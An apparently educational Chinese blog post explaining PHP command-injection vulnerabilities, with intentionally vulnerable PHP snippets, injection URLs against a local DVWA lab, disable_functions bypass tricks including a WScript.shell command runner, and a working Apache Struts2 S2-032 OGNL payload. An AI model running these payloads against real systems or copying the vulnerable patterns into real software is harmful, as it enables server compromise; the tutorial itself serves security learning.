@@ -1,0 +1,457 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>十大漏洞之命令执行 | lazy</title>
+  <meta name="author" content="lazy" />
+
+  
+  <meta name="description" content="可以用`&amp;amp;&amp;amp;’，’||’，’|’，’&amp;amp;’等来执行其它命令。当输入的参数有双引号时，如果引号没有被转义，我们可以先闭合引号。当是单引号时，需要先闭合单引号才能执行。" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="十大漏洞之命令执行" />
+  <meta property="og:site_name" content="lazy" />
+
+  
+  
+  
+  
+  
+
+  
+    <meta property="og:image" content="undefined" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="lazy" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">lazy</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">主页</a></li>
+    
+      <li><a href="/achieve">所有文章</a></li>
+    
+      <li><a href="/plan">学习计划</a></li>
+    
+      <li><a href="/developer">开发者</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+      <li><a href="http://www.cnblogs.com/lazy0">aother blog</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-04-28T13:26:36.000Z"><a href="/2016/04/28/十大漏洞之远程命令执行/">2016-04-28</a></time>
+      
+      
+  
+    <h1 class="title">十大漏洞之命令执行</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>可以用`&amp;&amp;’，’||’，’|’，’&amp;’等来执行其它命令。当输入的参数有双引号时，如果引号没有被转义，我们可以先闭合引号。当是单引号时，需要先闭合单引号才能执行。</p>
+<a id="more"></a>
+<h2 id="什么叫做代码执行漏洞："><a href="#什么叫做代码执行漏洞：" class="headerlink" title="什么叫做代码执行漏洞："></a>什么叫做代码执行漏洞：</h2><p>程序代码在处理输入输出的时候没有严格控制，导致用户可以构造参数包含执行远程代码在服务器上执行，进而获取服务器权限，发生在应用上的逻辑层的漏洞。</p>
+<p>##一些基本命令执行的函数：</p>
+<p><a href="">ob_start</a></p>
+<p>&lt;?php $cmd=”system”; ob_start($cmd);echo “$_GET[cunlide]”;ob_end_flush();?&gt;</p>
+<p><a href="">system</a></p>
+<p>system(“$_GET[cunlide]”);</p>
+<p><a href="">exec</a> </p>
+<p>echo exec(“$_GET[cunlide]”)</p>
+<p><a href="">shell_exec</a></p>
+<p>echo shell_exec(“$_GET(cunlide)”);</p>
+<p><a href="">passthru</a></p>
+<p>echo passthru(“$_GET[cunlide]”);</p>
+<p><a href="">``</a></p>
+<p>echo <code>$_GET[cunlide]</code>;</p>
+<p>除了上面的，还有很多函数可以执行命令。比如popen(),proc_open()，pcntl_exec()等函数。</p>
+<h2 id="基本的一些本地测试："><a href="#基本的一些本地测试：" class="headerlink" title="基本的一些本地测试："></a>基本的一些本地测试：</h2><h4 id="system-函数命令执行"><a href="#system-函数命令执行" class="headerlink" title="system()函数命令执行"></a>system()函数命令执行</h4><pre><code>&lt;?php    
+$dir=$_GET[&quot;dir&quot;];
+if(isset($dir))
+{
+    echo &quot;&lt;pre&gt;&quot;;
+    system(&quot;dir&quot;.$dir);
+    echo &quot;&lt;/pre&gt;&quot;;
+}
+?&gt;
+</code></pre><p>攻击者：</p>
+<pre><code>http://192.168.16.133/DVWA-1.9/cmd.php?dir&amp;&amp;ipconfig
+
+只是执行后面的
+http://192.168.16.133/DVWA-1.9/cmd.php?dir=|netstat%20-an
+
+执行了前面和后面的 
+http://192.168.16.133/DVWA-1.9/cmd.php?dir=||netstat%20-an 
+</code></pre><h4 id="exec-函数命令执行"><a href="#exec-函数命令执行" class="headerlink" title="exec()函数命令执行"></a>exec()函数命令执行</h4><pre><code> &lt;?php 
+    $cmd=$_GET[&quot;cmd&quot;];
+    $output=array();
+    echo &quot;&lt;pre&gt;&quot;;
+    exec($cmd,$output);
+    echo &quot;&lt;/pre&gt;&quot;;
+    while(list(key,$calue)=each($output))
+    {
+    echo $value.&quot;&lt;br&gt;&quot;;
+    }
+
+?&gt;
+</code></pre><p>攻击者：</p>
+<pre><code>http://192.168.16.133/DVWA-1.9/cmd.php?cmd=net user&amp;ipconfig
+</code></pre><h3 id="passthru函数命令执行"><a href="#passthru函数命令执行" class="headerlink" title="passthru函数命令执行"></a>passthru函数命令执行</h3><pre><code>&lt;?php
+$cmd=$_GET[&quot;cmd&quot;];
+echo &quot;&lt;pre&gt;&quot;;
+passthru($cmd);
+echo &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</code></pre><p>攻击者：</p>
+<pre><code>http://192.168.16.133/DVWA-1.9/cmd2.php?cmd=netstat -an|ipconfig
+</code></pre><h3 id="shell-exec-函数命令执行"><a href="#shell-exec-函数命令执行" class="headerlink" title="shell.exec()函数命令执行"></a>shell.exec()函数命令执行</h3><pre><code>&lt;?php
+$cmd=$_GET[&quot;cmd&quot;];
+echo &quot;&lt;pre&gt;&quot;;
+echo shell_exec($cmd);
+echo &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</code></pre><p>攻击者：</p>
+<pre><code>http://192.168.16.133/DVWA-1.9/cmd2.php?cmd=ipconfig||netstat -an
+</code></pre><h3 id="运算符命令执行"><a href="#运算符命令执行" class="headerlink" title="``运算符命令执行"></a>``运算符命令执行</h3><pre><code>&lt;?php
+$cmd=$_GET[&quot;cmd&quot;];
+$output=`$cmd`;
+echo &quot;&lt;pre&gt;&quot;;
+echo $output;
+echo &quot;&lt;/pre&gt;&quot;;    
+?&gt;
+</code></pre><p>攻击者：</p>
+<pre><code>http://192.168.16.133/DVWA-1.9/cmd2.php?cmd=ipconfig|netsta -an
+</code></pre><h3 id="popen-函数命令执行"><a href="#popen-函数命令执行" class="headerlink" title="popen()函数命令执行"></a>popen()函数命令执行</h3><pre><code>&lt;?php
+popen(&apos;whoami&gt;&gt;C:/wamp/www/DVWA-1.9/2.txt&apos;,&apos;r&apos;);
+?&gt;
+</code></pre><p>攻击者：(访问链接，就会创建一个文件，显示命令信息)</p>
+<pre><code>http://192.168.16.133/DVWA-1.9/cmd2.php
+</code></pre><h3 id="proc-open-函数命令执行"><a href="#proc-open-函数命令执行" class="headerlink" title="proc_open()函数命令执行"></a>proc_open()函数命令执行</h3><pre><code>&lt;?php  
+$test = &quot;ls /tmp/test&quot;;  
+$array =   array(  
+ array(&quot;pipe&quot;,&quot;r&quot;),   //标准输入  
+ array(&quot;pipe&quot;,&quot;w&quot;),   //标准输出内容  
+ array(&quot;pipe&quot;,&quot;w&quot;)    //标准输出错误  
+ );  
+
+$fp = proc_open($test,$array,$pipes);   //打开一个进程通道  
+echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容  
+proc_close($fp);  
+?&gt;  
+</code></pre><p><a href="">不会使用，暂时没有做测试，懂得，可以发邮件联系我，相互学习</a></p>
+<h2 id="命令执行的绕过方法"><a href="#命令执行的绕过方法" class="headerlink" title="命令执行的绕过方法"></a>命令执行的绕过方法</h2><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><pre><code>进制webshell执行命令原理
+
+php 配置文件php.ini 里面disable_function=配置,这里是进制某些函数
+
+紧着php的执行命令函数
+
+disable_functions=system,exec,popen,passthru
+</code></pre><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><pre><code>php下执行系统命令的函数有哪些
+
+assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号)
+
+php.ini里面没有完全限制死，有漏掉的函数，
+</code></pre><h4 id="系统组件绕过"><a href="#系统组件绕过" class="headerlink" title="系统组件绕过"></a>系统组件绕过</h4><pre><code>&lt;?php
+$command=$_POST[a];
+$wsh=new COM(&apos;WScript.shell&apos;);
+$exec=$wsh-&gt;exec(&apos;cmd.exe /c&apos;.$command);
+$stdout=$exec-&gt;stdOut();
+$strout=$stdout-&gt;ReadALL();
+echo $stroutput;
+?&gt;
+
+不想让攻击者绕过组件，就删除掉wshom.ocx
+</code></pre><h4 id="拓展库绕过"><a href="#拓展库绕过" class="headerlink" title="拓展库绕过"></a>拓展库绕过</h4><pre><code>php create_function（）匿名函数，注入命令执行
+
+&lt;?php
+$sort_by=$_GET[&apos;sort_by&apos;];
+$sorter=&apos;strnatcasecmp&apos;;
+$databases=array(&apos;test&apos;,&apos;test&apos;);
+$sort_function=&apos;return 1 *&apos;.$sorter. &apos;($a[&quot;&apos;.$sort_by.&apos;&quot;],$b[&quot;&apos;.$sort_by.&apos;&quot;]);&apos;;
+usort($databases,create_function(&apos;$a,$b&apos;,$sort_function));
+?&gt;
+</code></pre><h2 id="DVWA案例分析："><a href="#DVWA案例分析：" class="headerlink" title="DVWA案例分析："></a>DVWA案例分析：</h2><h4 id="DVWA低级命令执行："><a href="#DVWA低级命令执行：" class="headerlink" title="DVWA低级命令执行："></a>DVWA低级命令执行：</h4><p><a href="">源代码：</a></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ &apos;ip&apos; ];
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
+        // Windows
+        $cmd = shell_exec( &apos;ping  &apos; . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
+    }
+
+    // Feedback for the end user
+    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+}
+
+?&gt; 
+</code></pre><p>分析源代码，发现，在传入ip以后，仅仅就做了一个过滤，</p>
+<p>过滤是不是windows操作系统，然后直接带入操作，</p>
+<p>进而导致攻击者拼接命令执行。</p>
+<pre><code>ping 127.0.0.1&amp;net user
+ping 127.0.0.1&amp;&amp;net user
+ping 127.0.0.1|net user
+ping 127.0.0.1||net user
+</code></pre><h4 id="DVWA中级命令执行："><a href="#DVWA中级命令执行：" class="headerlink" title="DVWA中级命令执行："></a>DVWA中级命令执行：</h4><p><a href="">源代码</a></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ &apos;ip&apos; ];
+
+    // Set blacklist
+    $substitutions = array(
+        &apos;&amp;&amp;&apos; =&gt; &apos;&apos;,
+        &apos;;&apos;  =&gt; &apos;&apos;,
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
+        // Windows
+        $cmd = shell_exec( &apos;ping  &apos; . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
+    }
+
+    // Feedback for the end user
+    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+}
+
+?&gt;
+</code></pre><p>相比之下，比低级的稍微好点，但是我们仍然可以通过管道符，绕过过来，拼接命令</p>
+<pre><code>ping 127.0.0.1|net user
+ping 127.0.0.1||net user
+</code></pre><h4 id="DVWA高级命令执行："><a href="#DVWA高级命令执行：" class="headerlink" title="DVWA高级命令执行："></a>DVWA高级命令执行：</h4><pre><code>高级的，我感觉就不存在漏洞了，他过滤你是不是都是数字，然后.号分割四分，然后组合，感觉无法拼接命令执行。
+</code></pre><h2 id="现实中的案例："><a href="#现实中的案例：" class="headerlink" title="现实中的案例："></a>现实中的案例：</h2><h4 id="Apache-Struts-2-S2-032-远程命令执行漏洞"><a href="#Apache-Struts-2-S2-032-远程命令执行漏洞" class="headerlink" title="Apache Struts 2 S2-032 远程命令执行漏洞"></a>Apache Struts 2 S2-032 远程命令执行漏洞</h4><p>Apache Struts 2.3.18 ~ 2.3.28 之间版本（除了 2.3.20.2 与 2.3.24.2 版本）</p>
+<pre><code>http://d047ab33ccbe2dda8.jie.sangebaimao.com/struts2-showcase/filedownload/index.action?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&amp;res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=net user
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/十大漏洞/">十大漏洞</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/上传绕过/">上传绕过</a>, <a href="/tags/渗透测试/">渗透测试</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="widget tag">
+    <h3 class="title">关于文章</h3>
+    <div class="entry">
+    <P>文章有问题可以发邮件</p>
+    <p>大家彼此相互学习</p>
+      <p>邮箱：lazy@dropsec.xyz</p>
+    </div>
+</div>
+
+  <div class="widget tag">
+    <h3 class="title">赞助我</h3>
+    <div class="entry">
+      <img src='/css/images/qr_alipay.png' style='width:100%;background:rgba(255,255,255,0.6)' />
+    </div>
+</div>
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/MarkDown/" style="font-size: 10px;">MarkDown</a> <a href="/tags/hexo/" style="font-size: 20px;">hexo</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/sql注入，手工/" style="font-size: 10px;">sql注入，手工</a> <a href="/tags/sql注入，过狗，过waf/" style="font-size: 10px;">sql注入，过狗，过waf</a> <a href="/tags/上传绕过/" style="font-size: 15px;">上传绕过</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/渗透测试/" style="font-size: 15px;">渗透测试</a> <a href="/tags/渗透测试，命令执行/" style="font-size: 10px;">渗透测试，命令执行</a> <a href="/tags/过waf，过狗/" style="font-size: 10px;">过waf，过狗</a>
+  </div>
+</div>
+
+
+  
+  <div class="widget tag">
+    <h3 class="title">归档</h3>
+    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/06/">    2016年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/05/">    2016年05月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2016/04/">    2016年04月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/06/">    2015年06月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archive/2015/05/">    2015年05月</a><span class="archive-list-count">4</span></li></ul>
+  </div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/python/">python</a><small>2</small></li>
+  
+    <li><a href="/categories/十大漏洞/">十大漏洞</a><small>3</small></li>
+  
+    <li><a href="/categories/杂谈/">杂谈</a><small>4</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>3</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">近期文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2016/06/07/phpcms_2008远程代码执行漏洞/">phpcms-2008 远程代码执行漏洞</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/30/python_json模块/">python之json模块</a>
+      </li>
+    
+      <li>
+        <a href="/2016/05/27/python正则表达式/">python之正则表达式</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/28/十大漏洞之远程命令执行/">十大漏洞之命令执行</a>
+      </li>
+    
+      <li>
+        <a href="/2016/04/27/十大漏洞之文件上传/">十大漏洞之文件上传</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  <div class="widget tag">
+  <h3 class="title">友情链接</h3>
+  <div class="entry">
+    <ul>
+<!-- link start -->
+<li><a href='http://www.cnblogs.com/lazy0'>lazy</a></li>
+<li><a href='http://www.baidu.com'>baidu</a></li>
+<!-- link  end -->
+    </ul>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+    <h3 class="title">统计</h3>
+    <div class="entry">
+      
+	<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+
+    </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="alignleft">
+<span id="busuanzi_container_site_pv">
+    你好，你是第:<span id="busuanzi_value_site_pv"></span>位访客
+</span>
+</div>
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+</footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+<script>
+    //Kill XP and IE8
+    (function(){
+        var ua = navigator.userAgent;
+        var res = /Windows NT (\d+\.\d+)/.exec(ua);
+        var xpOrLower = res && JSON.parse(res[1]) < 6;
+        res = /MSIE (\d+\.\d+)/.exec(ua);
+        var ie8OrLower = res && JSON.parse(res[1]) < 9;
+        if(xpOrLower || ie8OrLower)
+        {
+            alert('请不要用XP及之前的Windows系统，和IE8及之前的IE浏览器访问本站！');
+            location.href = "about:blank";
+        }
+        var fromBaiduSE = /^https?:\/\/www.baidu.com/.test(document.referrer);
+        if(fromBaiduSE)
+        {
+            alert('检测到你还在使用百度搜索，作为一个程序员，这是一种自暴自弃！\n\n做不作恶的程序员，从不用百度开始！')
+            location.href = "about:blank";
+        }
+    })();
+</script>
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1260064002'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1260064002' type='text/javascript'%3E%3C/script%3E"));</script> 
+//前面要添加的代码  
+//百度统计的代码  
+
+<div id='bg'></div>
+</body>
+</html>
